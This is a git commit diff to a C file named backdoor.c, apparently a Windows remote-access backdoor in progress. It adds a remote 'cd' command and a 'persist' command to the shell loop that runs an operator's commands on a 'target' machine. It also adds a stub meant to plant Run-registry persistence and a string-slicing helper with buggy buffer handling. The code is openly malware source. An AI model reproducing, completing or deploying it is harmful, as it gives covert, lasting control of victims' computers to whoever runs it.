b387782c67bddd2f17b076532b63200d9fca5fff
ExploitDeveloperDil <166608060+ExploitDeveloperDil@users.noreply.github.com>
2024-10-07 16:59:01 +0000

    Persistance and String Manipulation Perfoamed In the Code

--- backdoor.c
+++ backdoor.c
@@ -22,6 +22,76 @@
 //Global Variable denotes here
 int sock;
 
+//Lets Code the bootrun function here..
+int bootRun()
+{
+  //The function not take any arguments as input because it will execute true false situations. 
+  //If success denoted by 0. neither nor return 1.
+  //My Registry Key > Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run.
+
+
+  //Make two variable to denote the error and success message of the bootRun Function.
+  char err[128] = "Failed to Set\n";
+  char suc[128] = "Created Persistance At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
+
+
+  
+}
+
+
+//The below function make slicing the command provided by the user as cd 'cut' directory.
+//Slicing the string `cd `
+//String manipulation allows us cut a string below.
+char *
+str_cut(char str[], int slice_from, int slice_to)
+{
+    if(str[0] == '\0')
+    {
+        return NULL;
+    }
+
+    char *buffer;
+    size_t str_len, buffer_len;
+
+    if(slice_to < 0 && slice_from > slice_to)
+    {
+        str_len = strlen(str);
+
+        if(abs(slice_to) > str_len - 1)
+        {
+            return NULL;
+        }
+
+        if(abs(slice_from) > str_len)
+        {
+            slice_from = (-1) * str_len;
+        }
+
+        buffer_len = slice_to - slice_from;
+        str += (str_len + slice_from);
+    }
+    else if(slice_from >= 0 && slice_to > slice_from)
+    {
+        str_len = strlen(str);
+
+        if(slice_from > str_len - 1)
+        {
+            return NULL;
+        }
+
+        buffer_len = slice_to - slice_from;
+        str += slice_from;
+    }
+    else
+    {
+        return NULL;
+    }
+
+    buffer = calloc(buffer_len, sizeof(char));
+    strncpy(buffer, str, buffer_len);
+    return buffer;
+}
+
 //Let's code shell void function that doesn't return any output it perfoam argument execution.
 //this shell function is able to executable commands in the target.
 void shell()
@@ -62,6 +132,21 @@ void shell()
         WSACleanup();//clean socket object
         exit(0);//exit the program
       }
+      //Want to add cd command to change the directory in target system.
+      else if (strncmp("cd ", buffer, 3) == 0)
+      {
+        //chdir function change directory.
+        //strcut function will cut the string into initiated values.
+        chdir(str_cut(buffer, 3, 100));
+      }
+      //want to make the program persistence in the target machine.
+      else if (strncmp("persist", buffer, 7) == 0)
+      {
+        //the bootRun function allows us to make persistance the backdoor when target rebooted.
+        bootRun();
+      }
+      
+      
       else 
       {
         //let's create a file descripter.
